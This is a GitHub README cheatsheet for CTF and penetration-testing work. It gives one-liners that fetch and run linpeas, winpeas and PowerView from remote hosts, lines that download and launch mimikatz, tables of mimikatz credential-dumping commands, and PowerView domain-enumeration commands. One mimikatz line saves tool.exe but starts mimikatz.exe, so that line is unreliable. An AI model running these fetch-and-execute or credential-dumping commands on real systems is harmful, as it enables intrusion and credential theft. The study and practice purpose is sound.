# cheatsheets
A collection of all my cheatsheets as well as scripts for CTFs

# Important Links

	https://hacktricks.wiki/ (best pentesting notes)
	https://blog.syselement.com/tcm
	https://hackwiki.com/
	https://hackviser.com/
	https://www.ired.team/
	https://swisskyrepo.github.io/PayloadsAllTheThings/
	http://www.pentest-standard.org/
	https://0xdf.gitlab.io/
	https://juggernaut-sec.com/
	https://infinitelogins.com/
	https://courses.redteamleaders.com/
	https://cyberiumx.com/generic/cehv13-practical-exam/
	https://www.thehacker.recipes/
    https://gchq.github.io/CyberChef/

# Lolbins and GTFObins
    
    https://lolbas-project.github.io/
    https://gtfobins.org/

# Index

## Linpeas
> [linpeas](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)
```sh
#local_version

curl -L https://raw.githubusercontent.com/Aaryan-khairnar/cheatsheets/refs/heads/main/linpeas.sh | sh

curl -L http://ip:port/linpeas.sh | sh
```

## Winpeas
> [winpeas.exe](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
> [winpeas.ps1](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/README.md)
```ps1
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Aaryan-khairnar/cheatsheets/refs/heads/main/winpeas.ps1')"

powershell "IEX(New-Object Net.WebClient).downloadString('http://ip:port/winpeas.ps1')"
```

## Mimikatz
> [mimikatz.exe click to download](https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/Win32/mimikatz.exe)
```ps1

Invoke-WebRequest -Uri "http://ip:port/mimikatz.exe" -OutFile "$env:TEMP\tool.exe"; Start-Process "$env:TEMP\mimikatz.exe"

Invoke-WebRequest -Uri "https://github.com/Aaryan-khairnar/cheatsheets/raw/refs/heads/main/mimikatz.exe" -OutFile "$env:TEMP\tool.exe"; Start-Process "$env:TEMP\mimikatz.exe"
curl -L "https://github.com/Aaryan-khairnar/cheatsheets/raw/refs/heads/main/mimikatz.exe" -o mimikatz.exe
```

#### mimikatz commands

Module        | What it covers
--------------|------------------------------------------------------------
standard      | General utility commands
privilege     | Process privilege inspection and adjustment
token         | Windows access tokens
process       | Process-related operations
service       | Windows service interactions
sekurlsa      | Local Security Authority authentication material
lsadump       | Security account and directory database analysis
kerberos      | Kerberos authentication and ticket operations
crypto        | Cryptographic provider and certificate-related operations
dpapi         | Data Protection API analysis
vault         | Windows Credential Vault
event         | Windows event-related functionality
sid           | Security identifier utilities

Command                       | Purpose
------------------------------|------------------------------------------------------------
privilege::debug              | Requests the debug privilege where permitted
token::whoami                 | Examines the current access token
process::list                 | Lists processes
service::list                 | Lists services
sekurlsa::logonpasswords      | Attempts to inspect logon authentication material
sekurlsa::msv                 | Examines MSV authentication material
sekurlsa::kerberos            | Examines Kerberos authentication material
sekurlsa::tickets             | Examines Kerberos tickets in the relevant context
kerberos::list                | Lists Kerberos tickets
lsadump::sam                  | Examines the local SAM database
lsadump::secrets              | Examines LSA secrets
lsadump::cache                | Examines cached domain logon data
crypto::certificates          | Examines certificates in supported certificate stores
vault::list                   | Lists supported Windows Vault information
dpapi::blob                   | Works with DPAPI-protected blobs

## Powerview

```
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Aaryan-khairnar/cheatsheets/refs/heads/main/powerview.ps1")

IEX (New-Object Net.WebClient).DownloadString("http://ip:port/PowerView.ps1")
```
| Command | Purpose |
|---|---|
| `Get-Domain` | Retrieves information about the current domain |
| `Get-DomainController` | Finds domain controllers |
| `Get-DomainUser` | Enumerates domain users |
| `Get-DomainComputer` | Enumerates domain computers |
| `Get-DomainGroup` | Enumerates domain groups |
| `Get-DomainGroupMember` | Lists members of a specified group |
| `Get-DomainPolicy` | Retrieves domain policy information |
| `Get-DomainOU` | Enumerates Organizational Units |
| `Get-DomainGPO` | Enumerates Group Policy Objects |
| `Get-DomainGPOLocalGroup` | Identifies local group membership configured through GPOs |

| Command | Purpose |
|---|---|
| `Get-DomainUser -Identity "<username>"` | Retrieves details for a specific user |
| `Get-DomainUser -SPN` | Finds users with Service Principal Names (Kerberoasting candidates) |
| `Get-DomainUser -PreauthNotRequired` | Finds accounts that do not require Kerberos pre-authentication |
| `Get-DomainGroup -Identity "<group>"` | Retrieves details for a specific group |
| `Get-DomainGroupMember -Identity "<group>"` | Lists members of a specified group |
| `Find-DomainUserLocation` | Finds computers where domain users may be logged on |

| Command | Purpose |
|---|---|
| `Get-DomainTrust` | Enumerates domain trusts |
| `Get-Forest` | Retrieves forest information |
| `Get-ForestDomain` | Lists domains in the forest |
| `Get-ForestTrust` | Enumerates forest trusts |

| Command | Purpose |
|---|---|
| `Find-InterestingDomainAcl` | Finds potentially interesting domain ACLs |
| `Get-DomainObjectAcl` | Retrieves ACLs on domain objects |
| `Get-ObjectAcl` | Retrieves object ACLs; availability depends on version |
| `Find-LocalAdminAccess` | Checks where the current user has local administrator access |
| `Get-DomainComputer -Unconstrained` | Finds computers configured for unconstrained delegation |
| `Get-DomainUser -TrustedToAuth` | Finds users configured for constrained delegation |
| `Get-DomainComputer -TrustedToAuth` | Finds computers configured for constrained delegation |

| Command | Purpose |
|---|---|
| `Find-DomainShare` | Searches for domain file shares |
| `Find-InterestingDomainShareFile` | Searches shares for potentially interesting files |
| `Get-NetLocalGroup` | Enumerates local groups on accessible computers |
| `Get-NetLocalGroupMember` | Lists members of local groups on accessible computers |

- Run PowerView from a PowerShell session where the script is loaded.
- Some commands require domain connectivity or sufficient permissions.
- PowerView function names and supported parameters can vary by version.
- Start with domain, user, group, and computer enumeration before investigating trusts, ACLs, and delegation.
- Use these commands only in authorized labs or CTF environments.

